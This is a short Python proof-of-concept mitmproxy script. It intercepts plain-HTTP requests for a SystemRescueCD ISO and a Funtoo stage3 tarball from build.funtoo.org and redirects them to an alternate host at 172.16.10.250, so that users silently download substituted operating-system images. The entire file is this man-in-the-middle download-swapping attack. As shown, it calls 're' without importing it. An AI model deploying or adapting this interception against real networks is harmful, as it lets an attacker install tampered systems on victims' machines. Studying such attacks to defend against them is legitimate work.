"""
This is taken from mitmproxy's examples, I've modified it quite a bit for this specific poc
"""
from netlib.http import Headers

def request(context, flow):


    if re.match("http://build\.funtoo\.org/distfiles/sysresccd/systemrescuecd-x86-.*\.iso", flow.request.url) is not None:
        flow.request.url = "http://172.16.10.250/systemrescuecd-x86-4.7.1.iso"

    if re.match("http://build\.funtoo\.org/funtoo-current/x86-64bit/generic_64/stage3-latest\.tar\.xz", flow.request.url) is not None:
        flow.request.url = "http://172.16.10.250/stage3-latest.tar.xz"

